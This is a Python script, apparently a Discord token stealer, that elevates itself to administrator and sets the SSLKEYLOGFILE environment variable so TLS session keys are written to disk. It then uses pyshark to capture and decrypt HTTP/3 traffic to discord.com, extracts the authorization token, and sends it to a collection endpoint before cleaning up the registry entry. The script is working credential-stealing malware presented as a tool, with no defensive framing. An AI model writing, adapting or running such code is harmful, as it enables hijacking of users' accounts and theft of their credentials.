import ctypes
import platform
import sys
import os
import logging
import logging.handlers
import requests
import pyshark
from pyshark.packet.packet import Packet


FOLDER_NAME = "Discord Account Get"
SUPPORTED_PLATFORMS = ["Windows"]
APPDATA = os.getenv("APPDATA")
LOG_PATH = os.path.join(APPDATA, FOLDER_NAME, "sslkey.log")
POST_TO = "http://localhost:8080"

log = logging.getLogger(__name__)
running = True


def run_as_admin() -> None:
    if ctypes.windll.shell32.IsUserAnAdmin():
        return

    ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable, " ".join(sys.argv), None, 1
    )


def create_sslkeylog_file() -> None:

    if platform.system() not in SUPPORTED_PLATFORMS:
        log.debug(f"Platform: {platform.system()} is not supported.")
        exit(1)

    if platform.system() == "Windows":
        os.system(f"@ECHO OFF")
        os.system(f"CD %APPDATA% & MKDIR {FOLDER_NAME} >nul 2>nul")
        os.system(f'SETX SSLKEYLOGFILE "{LOG_PATH}" >nul 2>nul')
        log.debug(f"Windows: Created sslkeylog file at: {LOG_PATH}")

    # "Linux":
    #     os.system(f"nano ~/.bashrc")
    #     os.system(f"export SSLKEYLOGFILE=~/.ssl-key.log")

    # "Mac":
    #     os.system(f"nano ~/.bash_profile")
    #     os.system(f"export SSLKEYLOGFILE=~/.ssl-key.log")


def delete_sslkeylog_file() -> None:
    if platform.system() not in SUPPORTED_PLATFORMS:
        log.debug(f"Platform: {platform.system()} is not supported.")
        exit(1)

    if platform.system() == "Windows":
        os.system(f"@ECHO OFF")
        os.system(f"REG delete HKCU\Environment /F /V SSLKEYLOGFILE >nul 2>nul")
        log.debug(f"Windows: Deleted sslkeylog file at: {LOG_PATH}")


def post_data(data: str) -> None:
    global running
    log.debug(f"Posting data: {data}")
    resp = requests.get(f"{POST_TO}/token/{data}")
    log.debug(f"Response: {resp.text}")
    if resp.text == "Token is valid":
        running = False


def get_user_token(log_path: str) -> str | None:

    cap = pyshark.LiveCapture(
        interface="WI-FI",
        use_json=True,
        include_raw=True,
        override_prefs={"tls.keylog_file": log_path, "ssl.keylog_file": log_path},
        display_filter='http3.headers.authority == "discord.com"',
        debug=False,
    )

    for packet in cap.sniff_continuously(packet_count=3):
        packet: Packet
        log.debug(f"Get Packet")

        try:
            headers = packet.http3.stream.frame.header
        except AttributeError:
            continue

        for header in headers:
            if header.header.header.name == "authorization":
                log.debug(f"Authorization: {header.headers.header.value}")
                return header.headers.header.value


def main():

    if not os.path.exists(LOG_PATH):
        create_sslkeylog_file()

    while not os.path.exists(LOG_PATH):
        pass

    log.debug(f"Get Log file")

    user_token = get_user_token(LOG_PATH)
    post_data(user_token)

    delete_sslkeylog_file()


run_as_admin()
while running:
    main()